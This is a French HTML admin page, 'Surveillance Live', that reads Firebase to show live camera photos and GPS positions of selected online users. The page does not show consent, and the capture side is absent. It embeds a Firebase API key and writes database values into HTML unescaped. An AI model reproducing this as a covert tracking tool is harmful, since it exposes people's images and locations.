<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Surveillance Live</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            background: #0f172a;
            color: #f8fafc;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 32px;
            border-radius: 24px;
            margin-bottom: 24px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 8px;
        }

        .user-selector {
            background: #1e293b;
            padding: 20px;
            border-radius: 16px;
            margin-bottom: 24px;
            border: 1px solid #334155;
        }

        .user-selector label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #94a3b8;
        }

        select {
            width: 100%;
            padding: 12px;
            border-radius: 12px;
            border: 1px solid #475569;
            background: #0f172a;
            color: #f8fafc;
            font-size: 1rem;
            outline: none;
        }

        /* Cadre récepteur d'image */
        .live-viewer {
            background: #000;
            border-radius: 24px;
            overflow: hidden;
            margin-bottom: 24px;
            position: relative;
            min-height: 480px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px dashed #334155;
        }

        /* Image dynamique au lieu de l'élément video */
        #remoteImage {
            width: 100%;
            height: auto;
            max-height: 70vh;
            object-fit: contain;
            display: none;
        }

        .placeholder-text {
            color: #64748b;
            font-size: 1.2rem;
            text-align: center;
            padding: 20px;
        }

        .controls {
            background: #1e293b;
            padding: 20px;
            border-radius: 16px;
            margin-bottom: 24px;
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            border: 1px solid #334155;
        }

        button {
            padding: 12px 24px;
            border-radius: 12px;
            border: none;
            cursor: pointer;
            font-weight: 600;
            font-size: 1rem;
            transition: all 0.2s ease;
        }

        button:active {
            transform: scale(0.97);
        }

        button:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .btn-primary {
            background: #667eea;
            color: white;
        }

        .btn-danger {
            background: #ef4444;
            color: white;
        }

        .fullscreen-btn {
            background: #475569;
            color: white;
        }

        .status {
            background: #1e293b;
            color: white;
            padding: 12px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid #334155;
            font-weight: 600;
        }

        .live-badge {
            background: #dc2626;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            animation: pulse 1s infinite;
            display: inline-block;
            margin-left: 10px;
            vertical-align: middle;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        .user-info {
            background: #1e293b;
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 16px;
            display: none;
            border: 1px solid #334155;
        }

        .connection-log {
            background: #020617;
            color: #38bdf8;
            padding: 12px;
            border-radius: 8px;
            font-size: 0.75rem;
            margin-top: 8px;
            font-family: monospace;
            max-height: 200px;
            overflow-y: auto;
            border: 1px solid #1e293b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎥 Administration - Live View</h1>
            <p>Visualisation photo et coordonnées GPS des utilisateurs</p>
        </div>

        <div class="user-selector">
            <label>👤 Sélectionner un utilisateur en ligne :</label>
            <select id="userSelect">
                <option value="">-- Attente d'utilisateurs actifs --</option>
            </select>
        </div>

        <div id="userInfo" class="user-info"></div>

        <div class="live-viewer" id="liveViewer">
            <div id="placeholderText" class="placeholder-text">💡 Sélectionnez un utilisateur et cliquez sur "Se connecter"</div>
            <img id="remoteImage" alt="Flux Live de l'utilisateur">
        </div>

        <div class="controls">
            <button id="connectBtn" class="btn-primary">🔗 Se connecter au flux</button>
            <button id="disconnectBtn" class="btn-danger" disabled>⏹️ Déconnecter</button>
            <button id="fullscreenBtn" class="fullscreen-btn" disabled>🖥️ Plein écran</button>
            <button id="debugBtn" style="background:#475569;">🐛 Infos Flux</button>
        </div>

        <div id="status" class="status">
            💡 En attente d'action
        </div>
        <div id="connectionLog" class="connection-log"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
        import { getDatabase, ref, onValue, off } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
            authDomain: "universite-taak.firebaseapp.com",
            databaseURL: "https://universite-taak-default-rtdb.firebaseio.com",
            projectId: "universite-taak",
            storageBucket: "universite-taak.firebasestorage.app",
            messagingSenderId: "550634728649",
            appId: "1:550634728649:web:12147e8dec3a04618c3118",
            measurementId: "G-RD7KY6BFP4"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        let currentUserId = null;
        let frameListenerRef = null;
        let locationListenerRef = null;

        const remoteImage = document.getElementById('remoteImage');
        const placeholderText = document.getElementById('placeholderText');
        const connectBtn = document.getElementById('connectBtn');
        const disconnectBtn = document.getElementById('disconnectBtn');
        const fullscreenBtn = document.getElementById('fullscreenBtn');
        const debugBtn = document.getElementById('debugBtn');
        const statusDiv = document.getElementById('status');
        const connectionLog = document.getElementById('connectionLog');
        const userSelect = document.getElementById('userSelect');
        const userInfoDiv = document.getElementById('userInfo');

        function addLog(message) {
            const time = new Date().toLocaleTimeString();
            connectionLog.innerHTML = `[${time}] ${message}<br>` + connectionLog.innerHTML;
        }

        function setStatus(message, isLive = false) {
            statusDiv.innerHTML = message;
            if (isLive) {
                statusDiv.style.background = '#dc2626';
                statusDiv.innerHTML += ' <span class="live-badge">LIVE</span>';
            } else {
                statusDiv.style.background = '#1e293b';
            }
        }

        function loadUsers() {
            const usersRef = ref(database, 'users');
            onValue(usersRef, (snapshot) => {
                const users = snapshot.val();
                
                // Conserver l'utilisateur actuellement sélectionné s'il existe toujours
                const previousSelection = userSelect.value;
                userSelect.innerHTML = '<option value="">-- Choisir un utilisateur --</option>';
                
                let foundActive = false;
                if (users) {
                    Object.keys(users).forEach(userId => {
                        if (users[userId].active === true) {
                            foundActive = true;
                            const isSelected = (userId === previousSelection) ? 'selected' : '';
                            userSelect.innerHTML += `<option value="${userId}" ${isSelected}>👤 Utilisateur #${userId.slice(-6)} (En ligne)</option>`;
                        }
                    });
                }
                
                if (!foundActive) {
                    userSelect.innerHTML = '<option value="">-- Aucun utilisateur actif actuellement --</option>';
                }
            });
        }

        // Écouter les infos GPS de l'utilisateur connecté
        function loadUserInfo(userId) {
            if (locationListenerRef) {
                off(locationListenerRef);
            }
            locationListenerRef = ref(database, `users/${userId}/location`);
            onValue(locationListenerRef, (snapshot) => {
                const location = snapshot.val();
                if (location) {
                    userInfoDiv.style.display = 'block';
                    userInfoDiv.innerHTML = `
                        <strong>📍 Position GPS de l'utilisateur :</strong><br>
                        Latitude : ${location.lat}<br>
                        Longitude : ${location.lng}<br>
                        <a href="https://www.google.com/maps?q=${location.lat},${location.lng}" 
                           target="_blank" style="color: #667eea; text-decoration: underline;">
                            🗺️ Ouvrir dans Google Maps
                        </a>
                        <br><small style="color: #64748b;">Mis à jour à : ${new Date(location.timestamp).toLocaleTimeString()}</small>
                    `;
                } else {
                    userInfoDiv.style.display = 'none';
                }
            });
        }

        function connectToUser() {
            currentUserId = userSelect.value;
            if (!currentUserId) {
                setStatus("⚠️ Sélectionnez un utilisateur d'abord");
                return;
            }

            // Nettoyer toute ancienne connexion active
            disconnect();

            currentUserId = userSelect.value;
            setStatus("🔄 Connexion au flux d'images...");
            connectBtn.disabled = true;
            disconnectBtn.disabled = false;
            fullscreenBtn.disabled = false;

            // Pointer l'écouteur vers le nœud où l'utilisateur envoie son flux d'images
            frameListenerRef = ref(database, `live/${currentUserId}/frame`);
            addLog(`🔍 Demande du flux pour l'utilisateur #${currentUserId.slice(-6)}...`);
            
            onValue(frameListenerRef, (snapshot) => {
                const data = snapshot.val();
                if (data && data.image) {
                    placeholderText.style.display = 'none';
                    remoteImage.src = data.image; // Injecte le flux Base64 directement
                    remoteImage.style.display = 'block';
                    
                    if (statusDiv.style.background !== 'rgb(220, 38, 38)') { // Si pas rouge live
                        setStatus("🔴 LIVE - Réception des photos", true);
                        addLog("✅ Flux d'images stabilisé !");
                    }
                } else {
                    addLog("⚠️ En attente de la première image de l'utilisateur...");
                }
            });

            loadUserInfo(currentUserId);
        }

        function disconnect() {
            if (frameListenerRef) {
                off(frameListenerRef);
                frameListenerRef = null;
            }
            if (locationListenerRef) {
                off(locationListenerRef);
                locationListenerRef = null;
            }
            
            remoteImage.src = "";
            remoteImage.style.display = 'none';
            placeholderText.style.display = 'block';
            userInfoDiv.style.display = 'none';
            
            connectBtn.disabled = false;
            disconnectBtn.disabled = true;
            fullscreenBtn.disabled = true;
            
            setStatus("🔌 Déconnecté");
            addLog("🔌 Déconnecté");
        }

        function toggleFullscreen() {
            if (!document.fullscreenElement) {
                remoteImage.requestFullscreen().catch(err => {
                    console.error("Erreur plein écran:", err);
                });
            } else {
                document.exitFullscreen();
            }
        }

        connectBtn.addEventListener('click', connectToUser);
        disconnectBtn.addEventListener('click', disconnect);
        fullscreenBtn.addEventListener('click', toggleFullscreen);
        userSelect.addEventListener('change', disconnect);
        
        debugBtn.addEventListener('click', () => {
            if (remoteImage.src) {
                addLog(`ℹ️ [DEBUG] Résolution naturelle de la photo reçue : ${remoteImage.naturalWidth}x${remoteImage.naturalHeight}px`);
            } else {
                addLog(`⚠️ [DEBUG] Aucun flux photo n'est actif pour le moment.`);
            }
        });

        // Charger la liste des utilisateurs au démarrage
        loadUsers();
    </script>
</body>
</html>
